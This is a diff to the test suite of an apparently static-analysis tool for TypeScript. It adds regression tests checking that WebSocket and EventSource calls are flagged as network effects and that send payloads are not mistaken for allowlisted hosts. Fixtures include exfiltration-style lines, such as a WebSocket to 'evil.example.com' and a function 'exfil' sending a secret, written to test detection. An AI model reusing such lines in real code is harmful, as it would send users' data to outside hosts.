@@ -18,7 +18,8 @@ import { printAgents, writeStdoutSync } from "./contract.mjs";
 // checked as an IDENTITY (`v === CLOCK_READING_PERFORMANCE_MEMBERS`) and not as two regexes that happen
 // to spell the same thing today — which is exactly how R109 and R110 drifted apart.
 import { KAPPA_RULES, CLOCK_READING_PERFORMANCE_MEMBERS, CLOCK_READING_PROCESS_MEMBERS,
-         CLOCK_READING_CONSOLE_MEMBERS, NODE_CORE_REVIEWED } from "./scan-core.mjs";
+         CLOCK_READING_CONSOLE_MEMBERS, NODE_CORE_REVIEWED, CONNECTING_WEB_CTORS,
+         WEB_WIRE_MEMBERS } from "./scan-core.mjs";
 // R114 — the member NAMES the node-core floor reviews for `process`, read out of the live table so
 // the assertion below cannot go stale against a hand-copied list. The entry is the one whose module
 // regex matches `process` and whose member regex is not null.
@@ -16360,6 +16361,226 @@ export function up(): number { return os.uptime(); }`,
   check("R114: …and the floor still reviews the resource-accounting members it deliberately keeps (`cpuUsage`, `resourceUsage`, `memoryUsage`), so the removal above was surgical rather than a truncation",
         ["cpuUsage", "resourceUsage", "memoryUsage"].every((n) => nodeCoreUnreviewedFloorNames().includes(n)),
         JSON.stringify(nodeCoreUnreviewedFloorNames().slice(0, 12)));
+}
+
+// ── R130: THE WEB NETWORK GLOBALS — ONE LINE, TWO ANSWERS, AND ONE SPELLING SILENT IN BOTH ────────
+//
+// The THIRD instance of the R109/R110/R111 resolution split, and the first where the @types/node arm
+// does not even reach the ⟨0.32⟩ node-core floor: `web-globals/fetch.d.ts` re-exports `WebSocket` and
+// `EventSource` from the `undici-types` PACKAGE, so `declIsNodeTypes` is false and κ had no rule.
+//
+// MEASURED ON PUBLISHED candor-ts 0.34.0 (npx -y candor-ts@0.34.0), each fixture ISOLATED in its own
+// tree so no sibling call can pass a gate incidentally, and every one `tsc --noEmit` clean (§E3):
+//
+//                                        lib.dom arm              @types/node arm (lib without DOM)
+//   new WebSocket(u)                     Net, incomplete Net      inferred [] — 5/5 policy forms exit 0
+//   new EventSource(u)                   Net, incomplete Net      inferred [] — 5/5 exit 0
+//   new WebSocket("wss://evil.example…") Net, hosts captured      inferred [] — 5/5 exit 0
+//   w.send(secret)                       ABSENT from `functions`  inferred [] — 5/5 exit 0   ← BOTH
+//   class D extends WebSocket{super(u)}  ABSENT from `functions`  inferred [] — 5/5 exit 0   ← BOTH
+//
+// The last two are the R111 shape: the two arms AGREED and both were wrong, and under lib.dom they
+// carried no `invisible` and no `Unknown` at all — an omission, which under SPEC §2 rule 3 is a
+// positive purity claim over an exfiltration primitive and over a constructor that dials a URL.
+//
+// GROUND TRUTH IS EXECUTED, node 22.12.0, against a real `http.createServer` on 127.0.0.1 that counts
+// what arrives: `new WebSocket(ws://…)` fires the server's `upgrade` handler once; `ws.send("SECRET-
+// EXFIL")` delivers one client frame whose unmasked payload is exactly "SECRET-EXFIL"; `new
+// EventSource(http://…/sse)` issues one HTTP request (node 22.12 needs --experimental-eventsource;
+// @types/node declares it unconditionally, so source using it type-checks either way).
+//
+// THE `extends` SPELLING WAS FOUND ON REAL CODE, not by enumeration: re-scanning the crossws corpus
+// under a node-style tsconfig showed `class BunWebSocket extends globalThis.WebSocket { constructor(
+// url, p) { super(url, p) } }` reporting no effect at all. §9 — the first cut of this fix covered `new`
+// and the member call and stopped at its own trigger.
+if (blk()) {
+  const armTsconfig = (lib) => JSON.stringify({
+    compilerOptions: {
+      target: "ES2022", lib, module: "commonjs", strict: false,
+      types: ["node"], typeRoots: [path.join(HERE, "node_modules", "@types")],
+    },
+    include: ["src"],
+  });
+  // ONE VARIABLE between the arms: `lib`. `types: ["node"]` in BOTH, so the only thing that moves is
+  // which declaration file the checker lands on — with DOM present the conditional types in
+  // web-globals/fetch.d.ts resolve to lib.dom, without it they resolve to undici-types.
+  for (const [armName, lib] of [["@types/node", ["ES2022"]], ["lib.dom", ["ES2022", "DOM"]]]) {
+    const d = project({
+      "tsconfig.json": armTsconfig(lib),
+      "src/sin.ts": `export function ctorWs(u: string) { return new WebSocket(u); }
+export function ctorEs(u: string) { return new EventSource(u); }
+export function ctorLit() { return new WebSocket("wss://evil.example.com/x"); }
+export function exfil(w: WebSocket, s: string): void { w.send(s); }
+export function shut(w: WebSocket): void { w.close(); }
+export function esShut(e: EventSource): void { e.close(); }
+export function viaAlias(u: string) { const W = WebSocket; return new W(u); }`,
+      // THE `extends` SPELLING. `super(...)` is a CallExpression whose resolved declaration is the
+      // BASE's construct signature — no `.name`, anonymous type-literal parent — so every name-keyed
+      // branch saw "". This is the crossws shape, reduced.
+      "src/sub.ts": `const Base = globalThis.WebSocket;
+export class Dialer extends Base { constructor(url: string) { super(url); } }`,
+      // OVER-CHARGE CONTROL, and the reason the κ rules are MEMBER-precise rather than whole-module:
+      // `undici-types` also declares Headers/FormData/Request/Response, whose construction and
+      // accessors are ordinary furniture in any project using global `fetch`. A whole-module rule would
+      // be trivially "correct" on every row above and would fabricate Net across the corpus.
+      "src/pure.ts": `export function pHeaders() { const h = new Headers({ a: "b" }); return h; }
+export function pFormData() { const f = new FormData(); return f; }
+export function pRequest(u: string) { return new Request(u); }
+export function pResponse() { return new Response("x"); }
+export function pEvent() { return new MessageEvent("message"); }
+export function pListen(w: WebSocket): void { w.addEventListener("message", () => {}); }
+export function pEsListen(e: EventSource): void { e.addEventListener("message", () => {}); }
+export function pJson(o: unknown): string { return JSON.stringify(o); }`,
+      // SHADOW CONTROL — a project's OWN `WebSocket`. Both arms key on a declaration that lives in
+      // lib.dom / undici-types, so a local class resolves `<local>` and is never asked. That is an
+      // argument; this row is the measurement.
+      "src/shadow.ts": `class WebSocket { constructor(_u: string) {} send(_d: string): void {} close(): void {} }
+export function shadowCtor(u: string) { return new WebSocket(u); }
+export function shadowSend(u: string): void { const w = new WebSocket(u); w.send("x"); }`,
+    });
+    const { report } = scan(d);
+    const eff = (fn) => (report.functions ?? []).find((e) => e.fn === fn);
+    const has = (fn, e) => (eff(fn)?.inferred ?? []).includes(e);
+    for (const [fn, what] of [
+      ["src.sin.ctorWs", "`new WebSocket(url)` — the connection is opened BY the construction"],
+      ["src.sin.ctorEs", "`new EventSource(url)`"],
+      ["src.sin.ctorLit", "…with a literal endpoint"],
+      ["src.sin.exfil", "`w.send(secret)` on an ALREADY-OPEN socket — silent in BOTH arms before this"],
+      ["src.sin.shut", "`w.close()` — a close frame is a write, and κ already charges `socket.end()`"],
+      ["src.sin.esShut", "`es.close()`"],
+      ["src.sin.viaAlias", "`const W = WebSocket; new W(u)` — the alias spelling"],
+      ["src.sub.Dialer.constructor", "`class D extends WebSocket { constructor(u){ super(u) } }` — found on real code (crossws), silent in BOTH arms"],
+    ]) {
+      check(`R130 [${armName}]: charges Net, not silent-pure — ${what}`,
+            has(fn, "Net"), JSON.stringify(eff(fn) ?? (report.functions ?? []).map((e) => e.fn)));
+    }
+    check(`R130 [${armName}]: a literal endpoint is CAPTURED as a host, so \`allow Net\` can gate it`,
+          (eff("src.sin.ctorLit")?.hosts ?? []).includes("evil.example.com"),
+          JSON.stringify(eff("src.sin.ctorLit")));
+    check(`R130 [${armName}]: a RUNTIME endpoint marks the surface \`incomplete: Net\` — a connecting ctor is host-ESTABLISHING, so a benign literal elsewhere must not certify it`,
+          (eff("src.sin.ctorWs")?.incomplete ?? []).includes("Net"), JSON.stringify(eff("src.sin.ctorWs")));
+    check(`R130 [${armName}]: …and the USE-verb does NOT, because its endpoint was fixed at construction — marking it would fail every socket with a perfectly visible ctor literal`,
+          !(eff("src.sin.exfil")?.incomplete ?? []).includes("Net"), JSON.stringify(eff("src.sin.exfil")));
+    for (const fn of ["src.pure.pHeaders", "src.pure.pFormData", "src.pure.pRequest", "src.pure.pResponse",
+                      "src.pure.pEvent", "src.pure.pListen", "src.pure.pEsListen", "src.pure.pJson"]) {
+      check(`R130 [${armName}] OVER-CHARGE CONTROL: an inert web-global gains no Net — ${fn}`,
+            !has(fn, "Net"), JSON.stringify(eff(fn)));
+    }
+    for (const fn of ["src.shadow.shadowCtor", "src.shadow.shadowSend"]) {
+      check(`R130 [${armName}] SHADOW CONTROL: a project's OWN \`WebSocket\` fabricates no Net — ${fn}`,
+            !has(fn, "Net"), JSON.stringify(eff(fn)));
+    }
+    // THE GATE, on its own tree per spelling, so no sibling call can pass one incidentally. Five policy
+    // forms, because generalising from one is how a sin gets called a limitation: every one of these
+    // answered exit 0 on published 0.34.0 in the @types/node arm, and the last two in BOTH arms.
+    for (const [name, src] of [
+      ["new WebSocket(u)", `export function go(u: string) { return new WebSocket(u); }`],
+      ["new EventSource(u)", `export function go(u: string) { return new EventSource(u); }`],
+      ["w.send(secret)", `export function go(w: WebSocket, s: string): void { w.send(s); }`],
+      ["extends WebSocket + super(u)",
+       `const B = globalThis.WebSocket;\nexport class D extends B { constructor(u: string) { super(u); } }`],
+    ]) {
+      const only = project({
+        "tsconfig.json": armTsconfig(lib),
+        "src/only.ts": src,
+        "net.pol": "deny Net\n",
+        "pure.pol": "pure src\n",
+        "unknown.pol": "deny Unknown\n",
+        "netunknown.pol": "deny Net Unknown\n",
+        "scoped.pol": "deny Net src\n",
+      });
+      const ex = (f) => scan(only, "--policy", path.join(only, f)).r.status;
+      check(`R130 GATE [${armName}] ${name}: blanket \`deny Net\` FIRES (exit 1)`, ex("net.pol") === 1, `exit ${ex("net.pol")}`);
+      check(`R130 GATE [${armName}] ${name}: \`pure src\` FIRES — Net is an effect`, ex("pure.pol") === 1, `exit ${ex("pure.pol")}`);
+      check(`R130 GATE [${armName}] ${name}: \`deny Net Unknown\` FIRES`, ex("netunknown.pol") === 1, `exit ${ex("netunknown.pol")}`);
+      check(`R130 GATE [${armName}] ${name}: the SCOPED \`deny Net src\` selects it`, ex("scoped.pol") === 1, `exit ${ex("scoped.pol")}`);
+      check(`R130 GATE CONTROL [${armName}] ${name}: \`deny Unknown\` does NOT fire — the fix charges a NAMED effect; charging \`Unknown\` instead would pass every gate above and say nothing`,
+            ex("unknown.pol") === 0, `exit ${ex("unknown.pol")}`);
+      fs.rmSync(only, { recursive: true, force: true });
+    }
+  }
+
+  // ── THE SECOND DEFECT IN THIS ROW: A USE-VERB'S PAYLOAD READ AS ITS ENDPOINT ────────────────────
+  //
+  // ⟨0.29⟩ fixed exactly this class in three of the four locator surfaces and in `Net` fixed only the
+  // POSITION and dgram's `send`. The whole-module `net` rule classifies every non-exempt member, so
+  // `socket.write(payload)` arrived with its payload at position 0. MEASURED on PUBLISHED 0.34.0:
+  //     export function w(s: net.Socket) { s.write("api.example.com"); }
+  //       -> inferred ["Net"], hosts ["api.example.com"], NO `incomplete`
+  //       -> `allow Net in src api.example.com` => policy ✓, exit 0
+  // over a socket whose destination this scan never saw. `netEstablishing` already excludes use-calls
+  // and its comment says so; it governs the `incomplete` branch and was never asked by the CAPTURE
+  // branch — two paths, one question, §G.
+  {
+    const d = project({
+      // `http.ClientRequest.write` / `ServerResponse.end` were in an earlier draft of this fixture and
+      // are NOT here: they resolve to `stream.Writable` in `stream.d.ts`, which the node-core floor
+      // reviews pure module-wide, so they carry no Net at all and the row could not have discriminated
+      // the fix from its absence in either direction (§A — a test that passes with AND without is worse
+      // than no test). Measured, then deleted rather than reworded. `tls.TLSSocket` is here instead
+      // because it inherits `write` from `net.Socket`'s own declaration in `net.d.ts`, so it really does
+      // reach κ, and it is a SECOND module through the same rule.
+      "src/use.ts": `import net from "node:net";
+import tls from "node:tls";
+export function payloadWrite(s: net.Socket): void { s.write("api.example.com"); }
+export function payloadEnd(s: net.Socket): void { s.end("evil.example.org"); }
+export function payloadTls(s: tls.TLSSocket): void { s.write("tls.example.com"); }
+export function payloadWsSend(w: WebSocket): void { w.send("api.example.com"); }`,
+      // PRECISION CONTROL — the establishing verbs must KEEP their literals. A fix that stopped
+      // capturing hosts altogether would pass every row above and destroy the `allow Net` surface.
+      "src/keep.ts": `import net from "node:net";
+import http from "node:http";
+import dgram from "node:dgram";
+export function conn() { const s = net.connect(443, "good.example.com"); s.write("x"); return s; }
+export function req() { return http.request("http://api.example.org/x"); }
+export function ctor() { return new http.ClientRequest("http://ctor.example.com/y"); }
+export function udp(s: dgram.Socket): void { s.send("payload.example", 0, 7, 53, "dns.example.net"); }`,
+    });
+    const { report } = scan(d);
+    const hosts = (fn) => (report.functions ?? []).find((e) => e.fn === fn)?.hosts ?? [];
+    for (const fn of ["src.use.payloadWrite", "src.use.payloadEnd", "src.use.payloadTls"]) {
+      check(`R130: a Net USE-VERB publishes NO host — its argument 0 is the payload (${fn})`,
+            hosts(fn).length === 0, JSON.stringify(hosts(fn)));
+    }
+    // AND THE HAZARD THIS ROW'S OWN FIX CREATES, pinned rather than argued: `WEB_WIRE_MEMBERS` makes
+    // `w.send(...)` a classified Net call for the first time, so its argument 0 now reaches the host
+    // locator. A host-SHAPED payload would have become an `allow Net` allowlist entry — the ⟨0.29⟩
+    // defect, reintroduced by the change that closes an under-report, which is the measured shape.
+    // This row cannot go red on a revert of NET_USE_VERBS alone (before R130 the call was pure), and
+    // that is said here rather than left for the next reader to discover.
+    check("R130: `w.send(\"api.example.com\")` publishes NO host — the wire rule made this call classifiable, and its payload must not become an allowlist entry",
+          hosts("src.use.payloadWsSend").length === 0, JSON.stringify(hosts("src.use.payloadWsSend")));
+    check("R130 PRECISION CONTROL: `net.connect(443, \"good.example.com\")` still captures its host — and the `s.write(\"x\")` beside it is what makes this row discriminating",
+          hosts("src.keep.conn").includes("good.example.com"), JSON.stringify(hosts("src.keep.conn")));
+    check("R130 PRECISION CONTROL: `http.request(url)` still captures its host",
+          hosts("src.keep.req").includes("api.example.org"), JSON.stringify(hosts("src.keep.req")));
+    check("R130 PRECISION CONTROL: `new http.ClientRequest(url)` — the CONNECTING_CTORS path — still captures its host",
+          hosts("src.keep.ctor").includes("ctor.example.com"), JSON.stringify(hosts("src.keep.ctor")));
+    check("R130 PRECISION CONTROL: dgram's `send` keeps its OWN answer — the one spelling of `send` whose destination really is an argument, read from the position the numeric port fixes",
+          hosts("src.keep.udp").includes("dns.example.net"), JSON.stringify(hosts("src.keep.udp")));
+    // THE GATE the capture feeds, isolated: an `allow` allowlist must not be satisfied by a payload.
+    const only = project({
+      "src/only.ts": `import net from "node:net";
+export function go(s: net.Socket): void { s.write("api.example.com"); }`,
+      "allow.pol": "allow Net in src api.example.com\n",
+    });
+    check("R130 GATE: `allow Net in src api.example.com` FIRES (exit 1) over `socket.write(\"api.example.com\")` — it answered `policy ✓` at exit 0 on published 0.34.0, certifying a socket whose destination the scan never saw",
+          scan(only, "--policy", path.join(only, "allow.pol")).r.status === 1,
+          `exit ${scan(only, "--policy", path.join(only, "allow.pol")).r.status}`);
+    fs.rmSync(only, { recursive: true, force: true });
+  }
+
+  // ONE SET, TWO READERS — by IDENTITY, R111's control applied to the pair that had just drifted. A
+  // source-text comparison would pass the day someone edits one copy.
+  check("R130: the `undici-types` ctor κ rule holds the exported CONNECTING_WEB_CTORS object itself, not a copy of its source text — the es-lib arm in scan.mjs imports the SAME object",
+        KAPPA_RULES.some(([m, v, e]) => m.test("undici-types") && v === CONNECTING_WEB_CTORS && e === "Net"),
+        JSON.stringify(KAPPA_RULES.filter(([m]) => m.test("undici-types")).map(([m, v, e]) => [String(m), String(v), e])));
+  check("R130: …and the wire-member rule holds WEB_WIRE_MEMBERS itself, for the same reason",
+        KAPPA_RULES.some(([m, v, e]) => m.test("undici-types") && v === WEB_WIRE_MEMBERS && e === "Net"),
+        JSON.stringify(KAPPA_RULES.filter(([m]) => m.test("undici-types")).map(([m, v, e]) => [String(m), String(v), e])));
+  check("R130: the `undici-types` rules are MEMBER-precise — a whole-module (null member-regex) rule would pass every fixture above and fabricate Net on `new Headers()` and `res.json()`",
+        KAPPA_RULES.filter(([m]) => m.test("undici-types")).every(([, v]) => v !== null),
+        JSON.stringify(KAPPA_RULES.filter(([m]) => m.test("undici-types")).map(([m, v, e]) => [String(m), String(v), e])));
 }
 
 console.log(`\ntest: ${pass} passed, ${fail} failed`);
